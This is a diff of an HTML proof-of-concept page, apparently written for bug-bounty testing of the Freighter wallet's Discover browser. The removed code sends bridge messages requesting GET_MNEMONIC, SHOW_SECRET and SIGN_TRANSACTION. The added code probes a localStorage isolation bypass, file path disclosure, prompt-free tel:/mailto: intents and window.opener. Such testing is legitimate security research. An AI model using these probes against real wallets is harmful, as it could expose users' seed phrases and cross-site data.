@@ -1,11 +1,36 @@
-<script>
-function tryBridge(type){
-  let payload = JSON.stringify({type: type, id: 1, payload: {}});
-  window.ReactNativeWebView.postMessage(payload);
-  console.log('Sent: ' + payload);
-}
-</script>
-<button onclick="tryBridge('SHOW_SECRET')">Test SHOW_SECRET</button>
-<button onclick="tryBridge('SIGN_TRANSACTION')">Test SIGN_TRANSACTION</button>
-<button onclick="tryBridge('GET_MNEMONIC')">Test GET_MNEMONIC</button>
-<button onclick="tryBridge('OPEN_SETTINGS')">Test OPEN_SETTINGS</button>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Freighter Other Bugs - 0x403for</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;padding:12px}
+button,a.btn{width:100%;padding:14px;margin:8px 0;background:#111;color:#0f0;border:1px solid #0f0;display:block;text-decoration:none;text-align:left;font-size:13px}
+pre{background:#111;padding:8px;height:150px;overflow:auto;border:1px solid #333;font-size:11px;white-space:pre-wrap}
+</style>
+</head>
+<body>
+<h2>Freighter Discover - Non Spoof</h2>
+<p style="color:#ff0">BUKA DI FREIGHTER > DISCOVER</p>
+
+<h3>1. Storage Isolation Bypass [HIGH]</h3>
+<button onclick="localStorage.setItem('evil_0x403for','EVIL_FROM_0x403for'); alert('Tertulis! Sekarang buka aqua.network di tab Discover yang sama, lalu cek localStorage.getItem(evil_0x403for)');">A. Tulis evil key</button>
+<button onclick="alert(localStorage.getItem('evil_0x403for'))">B. Baca evil key</button>
+<button onclick="let s=''; for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i); s+=k+'='+localStorage.getItem(k).slice(0,30)+'\n'} alert(s)">C. List semua keys</button>
+
+<h3>2. File Path Disclosure</h3>
+<input type="file" id="f" style="width:100%">
+<button onclick="alert(document.getElementById('f').value)">D. Cek file path</button>
+
+<h3>3. Intent Tanpa Prompt</h3>
+<a class="btn" href="tel:081234567890">E. Test tel:</a>
+<a class="btn" href="mailto:test@test.com">F. Test mailto:</a>
+
+<h3>4. window.opener</h3>
+<button onclick="let w=window.open('about:blank'); w.document.write('<h1>opener:'+!!window.opener+'</h1>')">G. Test about:blank opener</button>
+
+<pre id="log"></pre>
+<script>document.getElementById('log').innerText='URL: '+location.href;</script>
+</body>
+</html>
